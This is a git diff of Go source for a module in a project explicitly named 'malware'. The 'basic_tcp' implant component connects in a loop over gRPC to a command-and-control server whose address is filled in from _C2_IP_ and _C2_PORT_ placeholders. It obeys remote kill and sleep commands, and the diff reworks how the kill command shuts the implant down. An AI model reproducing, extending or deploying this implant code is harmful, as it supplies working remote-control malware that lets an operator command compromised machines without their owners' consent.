@@ -8,7 +8,6 @@ import (
 	"malware/common/messages"
 	"malware/common/types"
 	"malware/implant/included_modules"
-	"os"
 	"time"
 
 	"google.golang.org/grpc"
@@ -17,9 +16,9 @@ import (
 )
 
 type state struct {
-	running bool
 	conn    *grpc.ClientConn
 	grpc    *grpc.Server
+	running bool
 }
 
 type settings struct {
@@ -45,7 +44,8 @@ func (settings settings) doConnection() {
 	}
 
 	if reply.GetKill() {
-		os.Exit(0)
+		settings.state.running = false
+		return
 	}
 
 	if reply.GetSleep() != 0 {
@@ -101,6 +101,8 @@ func (settings settings) fixConnection() {
 }
 
 func (settings settings) listenServer() {
+	settings.state.running = true
+
 	for settings.state.running {
 		settings.fixConnection()
 		settings.doConnection()
@@ -114,23 +116,18 @@ func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.C
 	return false
 }
 
-func Create() types.Module {
+func Init() {
 	port := int32(_C2_PORT_)
 	ip := "_C2_IP_"
-	state := state{}
+	state := &state{}
 	host := fmt.Sprintf("%s:%d", ip, port)
 
-	return settings{&state, host}
-}
-
-func (settings settings) Init() {
-	settings.state.running = true
+	settings := settings{state, host}
 
 	settings.listenServer()
 }
 
 func (settings settings) Shutdown() {
-	settings.state.running = false
 }
 
 func (settings) ID() string { return "basic_tcp" }
